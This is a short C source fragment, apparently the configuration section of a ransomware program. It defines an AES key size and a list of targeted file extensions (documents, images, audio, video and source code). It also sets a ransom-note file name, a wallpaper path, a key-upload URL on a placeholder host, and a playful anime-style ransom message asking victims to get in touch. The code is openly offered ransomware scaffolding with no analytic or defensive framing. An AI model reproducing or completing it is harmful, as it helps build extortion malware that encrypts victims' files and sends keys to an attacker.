#define AES_KEY_SIZE 32

// List of known data file types
const char* fileTypes[] = {
    ".zip",
    ".txt",
    ".doc",
    ".docx",
    ".pptx",
    ".xls",
    ".pdf",
    ".gif",
    ".jpg",
    ".jpeg",
    ".png",
    ".mp3",
    ".mp4",
    ".ogg",
    ".wav",
    ".webm",
    ".html",
    ".c",
    ".cc",
    ".cpp",
    ".h",
    ".hh",
    ".hpp",
    ".py",
    ".java",
    ".rs"
};

const int numFileTypes = sizeof(fileTypes) / sizeof(fileTypes[0]);
const char* wallpaperPath = "/path/to/your/wallpaper.jpg";
const char* textFileName = "README_DECRYPT.txt";
const char* serverURL = "https://example.com/save_key.php"; 
const char* message = "o-oops... i accidentally cast \"Perfect Freeeeeeeeze!\" on your files! >_<\n(your files have been encrypted and are safe with me!)\nanyway, if you want your files back, please contact me at: [email], b-baka...\n";
